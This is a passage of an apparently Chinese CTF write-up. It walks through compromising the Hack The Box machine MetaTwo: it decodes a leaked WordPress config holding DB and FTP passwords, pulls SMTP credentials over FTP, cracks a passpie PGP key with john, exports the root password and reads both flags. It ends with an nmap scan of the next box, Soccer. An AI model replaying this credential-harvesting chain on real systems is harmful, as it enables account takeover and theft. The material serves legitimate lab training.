U83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==                                                                                                                             
+[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Closing
+</code></pre>
+<p>base64解码</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# echo &quot;PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==&quot; |base64 -d
+&lt;?php
+/** The name of the database for WordPress */
+define( &#39;DB_NAME&#39;, &#39;blog&#39; );
+
+/** MySQL database username */
+define( &#39;DB_USER&#39;, &#39;blog&#39; );
+
+/** MySQL database password */
+define( &#39;DB_PASSWORD&#39;, &#39;635Aq@TdqrCwXFUZ&#39; );
+
+/** MySQL hostname */
+define( &#39;DB_HOST&#39;, &#39;localhost&#39; );
+
+/** Database Charset to use in creating database tables. */
+define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );
+
+/** The Database Collate type. Don&#39;t change this if in doubt. */
+define( &#39;DB_COLLATE&#39;, &#39;&#39; );
+
+define( &#39;FS_METHOD&#39;, &#39;ftpext&#39; );
+define( &#39;FTP_USER&#39;, &#39;metapress.htb&#39; );
+define( &#39;FTP_PASS&#39;, &#39;9NYS_ii@FyL_p5M2NvJ&#39; );
+define( &#39;FTP_HOST&#39;, &#39;ftp.metapress.htb&#39; );
+define( &#39;FTP_BASE&#39;, &#39;blog/&#39; );
+define( &#39;FTP_SSL&#39;, false );
+
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * @since 2.6.0
+ */
+define( &#39;AUTH_KEY&#39;,         &#39;?!Z$uGO*A6xOE5x,pweP4i*z;m`|.Z:X@)QRQFXkCRyl7&#125;`rXVG=3 n&gt;+3m?.B/:&#39; );
+define( &#39;SECURE_AUTH_KEY&#39;,  &#39;x$i$)b0]b1cup;47`YVua/JHq%*8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf&#123;=]a%&#39; );
+define( &#39;LOGGED_IN_KEY&#39;,    &#39;J+mxCaP4z&lt;g.6P^t`ziv&gt;dd&#125;EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C&#123;qKXy&#39; );
+define( &#39;NONCE_KEY&#39;,        &#39;SmeDr$$O0ji;^9]*`~GNe!pX@DvWb4m9Ed=Dd(.r-q&#123;^z(F?)7mxNUg986tQO7O5&#39; );
+define( &#39;AUTH_SALT&#39;,        &#39;[;TBgc/,M#)d5f[H*tg50ifT?Zv.5Wx=`l@v$-vH*&lt;~:0]s&#125;d&lt;&amp;M;.,x0z~R&gt;3!D&#39; );
+define( &#39;SECURE_AUTH_SALT&#39;, &#39;&gt;`VAs6!G955dJs?$O4zm`.Q;amjW^uJrk_1-dI(SjROdW[S&amp;~omiH^jVC?2-I?I.&#39; );
+define( &#39;LOGGED_IN_SALT&#39;,   &#39;4[fS^3!=%?HIopMpkgYboy8-jl^i]Mw&#125;Y d~N=&amp;^JsI`M)FJTJEVI) N#NOidIf=&#39; );
+define( &#39;NONCE_SALT&#39;,       &#39;.sU&amp;CQ@IRlh O;5aslY+Fq8QWheSNxd6Ve#&#125;w!Bq,h&#125;V9jKSkTGsv%Y451F8L=bL&#39; );
+
+/**
+ * WordPress Database Table prefix.
+ */
+$table_prefix = &#39;wp_&#39;;
+
+/**
+ * For developers: WordPress debugging mode.
+ * @link https://wordpress.org/support/article/debugging-in-wordpress/
+ */
+define( &#39;WP_DEBUG&#39;, false );
+
+/** Absolute path to the WordPress directory. */
+if ( ! defined( &#39;ABSPATH&#39; ) ) &#123;
+        define( &#39;ABSPATH&#39;, __DIR__ . &#39;/&#39; );
+&#125;
+
+/** Sets up WordPress vars and included files. */
+require_once ABSPATH . &#39;wp-settings.php&#39;;
+</code></pre>
+<p>得到一个用户名为<code>metapress.htb</code>，密码<code>9NYS_ii@FyL_p5M2NvJ</code></p>
+<h3 id="ftp连接"><a href="#ftp连接" class="headerlink" title="ftp连接"></a>ftp连接</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# ftp 10.10.11.186                                                                                    
+Connected to 10.10.11.186.
+220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+Name (10.10.11.186:root): metapress.htb
+331 Password required for metapress.htb
+Password:
+230 User metapress.htb logged in
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
+drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
+226 Transfer complete
+ftp&gt; cd mailer
+250 CWD command successful
+ftp&gt; ls
+200 PORT command successful
+150 Opening ASCII mode data connection for file list
+drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
+-rw-r--r--   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
+226 Transfer complete
+ftp&gt; cat send_email.php
+?Invalid command
+ftp&gt; get send_email.php
+local: send_email.php remote: send_email.php
+200 PORT command successful
+150 Opening BINARY mode data connection for send_email.php (1126 bytes)
+226 Transfer complete
+1126 bytes received in 0.30 secs (3.7217 kB/s)
+ftp&gt;
+</code></pre>
+<p>查看send_email.php，需要get下来查看</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# cat send_email.php 
+&lt;?php
+/*
+ * This script will be used to send an email to all our users when ready for launch
+*/
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+require &#39;PHPMailer/src/Exception.php&#39;;
+require &#39;PHPMailer/src/PHPMailer.php&#39;;
+require &#39;PHPMailer/src/SMTP.php&#39;;
+
+$mail = new PHPMailer(true);
+
+$mail-&gt;SMTPDebug = 3;                               
+$mail-&gt;isSMTP();            
+
+$mail-&gt;Host = &quot;mail.metapress.htb&quot;;
+$mail-&gt;SMTPAuth = true;                          
+$mail-&gt;Username = &quot;jnelson@metapress.htb&quot;;                 
+$mail-&gt;Password = &quot;Cb4_JmWM8zUZWMu@Ys&quot;;                           
+$mail-&gt;SMTPSecure = &quot;tls&quot;;                           
+$mail-&gt;Port = 587;                                   
+
+$mail-&gt;From = &quot;jnelson@metapress.htb&quot;;
+$mail-&gt;FromName = &quot;James Nelson&quot;;
+
+$mail-&gt;addAddress(&quot;info@metapress.htb&quot;);
+
+$mail-&gt;isHTML(true);
+
+$mail-&gt;Subject = &quot;Startup&quot;;
+$mail-&gt;Body = &quot;&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;&quot;;
+
+try &#123;
+    $mail-&gt;send();
+    echo &quot;Message has been sent successfully&quot;;
+&#125; catch (Exception $e) &#123;
+    echo &quot;Mailer Error: &quot; . $mail-&gt;ErrorInfo;
+&#125;
+</code></pre>
+<p>得到一个名为<code>jnelson</code>，密码为<code>Cb4_JmWM8zUZWMu@Ys</code>的用户信息</p>
+<h3 id="ssh连接-1"><a href="#ssh连接-1" class="headerlink" title="ssh连接"></a>ssh连接</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# ssh jnelson@10.10.11.186
+jnelson@10.10.11.186&#39;s password: 
+Linux meta2 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Feb 11 09:42:56 2023 from 10.10.16.8
+jnelson@meta2:~$ ls
+user.txt
+jnelson@meta2:~$ cat user.txt
+9cea4959b5de232f1af39e8d62842cbb
+jnelson@meta2:~$ 
+</code></pre>
+<p>拿到user flag</p>
+<h3 id="提权-2"><a href="#提权-2" class="headerlink" title="提权"></a>提权</h3><p>看到一个.passpie文件还有个.keys文件</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/marcwebbie/passpie" >https://github.com/marcwebbie/passpie<i class="fas fa-external-link-alt"></i></a></p>
+<pre><code class="shell">jnelson@meta2:~$ ls -a
+.  ..  .bash_history  .bash_logout  .bashrc  .local  .passpie  .profile  user.txt
+jnelson@meta2:~$ cd .passpie/
+jnelson@meta2:~/.passpie$ ls -al
+total 24
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
+drwxr-xr-x 4 jnelson jnelson 4096 Oct 25 12:53 ..
+-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
+-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
+</code></pre>
+<pre><code class="shell">jnelson@meta2:~/.passpie$ cat .keys
+-----BEGIN PGP PUBLIC KEY BLOCK-----
+
+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
+fo6KI+w2uXLaw+bIT1XZurDN
+=dqsF
+-----END PGP PUBLIC KEY BLOCK-----
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+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
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+</code></pre>
+<p>查看到.keys文件，保存到本地</p>
+<h4 id="john爆破-1"><a href="#john爆破-1" class="headerlink" title="john爆破"></a>john爆破</h4><p>可以看到文件上半部分为公钥，下半部分为私钥，我们只需要破解私钥即可</p>
+<p>要先将其转化为json格式</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# gpg2john key &gt; gpg.john
+
+File key
+</code></pre>
+<p>爆破出密码为<code>blink182</code></p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# john -w=/usr/share/wordlists/rockyou.txt gpg.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+blink182         (Passpie)
+1g 0:00:00:03 DONE (2023-02-11 05:59) 0.2785g/s 46.79p/s 46.79c/s 46.79C/s ginger..987654
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<h4 id="查看密码"><a href="#查看密码" class="headerlink" title="查看密码"></a>查看密码</h4><p>检查 <code>passpie</code> 的列表</p>
+<p>在 <code>pass</code> 文件中导出密码</p>
+<pre><code class="shell">jnelson@meta2:~/.passpie$ passpie list
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛
+jnelson@meta2:~/.passpie$ touch pass
+touch: cannot touch &#39;pass&#39;: Permission denied
+jnelson@meta2:~/.passpie$ cd ..
+jnelson@meta2:~$ touch pass
+jnelson@meta2:~$ passpie export pass
+Passphrase: 
+jnelson@meta2:~$ cat pass
+credentials:
+- comment: &#39;&#39;
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode &#39;p7qfAZt4_A1xo_0x&#39;
+- comment: &#39;&#39;
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode &#39;Cb4_JmWM8zUZWMu@Ys&#39;
+handler: passpie
+version: 1.0
+</code></pre>
+<p>得到<code>root</code>用户密码<code>p7qfAZt4_A1xo_0x</code></p>
+<pre><code class="shell">jnelson@meta2:~$ su root
+Password: 
+root@meta2:/home/jnelson# cd ..
+root@meta2:/home# cd ..
+root@meta2:/# ls
+bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var  vmlinuz  vmlinuz.old
+root@meta2:/# cd root
+root@meta2:~# ls
+restore  root.txt
+root@meta2:~# cat root.txt
+113bdf1882bf63317bf4f786e6294de2
+</code></pre>
+<p>得到root flag</p>
+<h2 id="Soccer"><a href="#Soccer" class="headerlink" title="Soccer"></a>Soccer</h2><h3 id="nmap扫描-3"><a href="#nmap扫描-3" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# nmap -sC -sV 10.10.11.194
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 22:04 EST
+Nmap scan report for 10.10.11.194 (10.10.11.194)
+Host is up (0.58s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
